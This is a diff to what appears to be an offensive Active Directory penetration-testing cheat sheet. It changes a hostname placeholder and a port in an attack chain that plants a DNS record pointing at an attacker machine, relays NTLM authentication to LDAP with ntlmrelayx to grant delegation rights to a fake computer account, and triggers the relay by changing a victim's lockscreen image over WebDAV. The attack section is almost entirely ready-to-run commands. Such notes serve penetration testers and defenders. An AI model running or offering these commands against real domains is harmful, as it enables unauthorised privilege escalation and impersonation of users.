@@ -1022,22 +1022,22 @@ python3 addcomputer.py -computer-name FAKE01 -computer-pass '123456' <DOMAIN>/<U
 - https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py
 - https://github.com/Kevin-Robertson/Powermad/blob/master/Invoke-DNSUpdate.ps1
 ```
-dnstool.py -u <DOMAIN>\<USER> -a add -r webdav.<DOMAIN> -d <ATTACKER IP> <DC IP>
+dnstool.py -u <DOMAIN>\<USER> -a add -r <HOSTNAME> -d <ATTACKER IP> <DC IP>
 
 $creds = get-credential
-Invoke-DNSUpdate -DNSType A -DNSName webdav.<DOMAIN> -DNSData <IP ATTACKING MACHINE> -Credential $creds -Realm <DOMAIN>
+Invoke-DNSUpdate -DNSType A -DNSName <HOSTNAME> -DNSData <IP ATTACKING MACHINE> -Credential $creds -Realm <DOMAIN>
 ```
 - Didn't test dnstool for this attack
 
 #### Serve image with impacket
 ```
-sudo python3 ntlmrelayx.py -t ldap://<DC FQDN> --delegate-access --escalate-user FAKE01$ --serve-image ./image.jpg
+sudo python3 ntlmrelayx.py -t ldap://<DC FQDN> --delegate-access --escalate-user FAKE01$ --serve-image ./image.jpg --http-port 8080
 ```
 
 #### Change lockscreen image
 - https://github.com/nccgroup/Change-Lockscreen
 ```
-change-lockscreen -webdav \\webdav@80\
+change-lockscreen -webdav \\webdav@8080\
 ```
 
 #### Impersonate any user
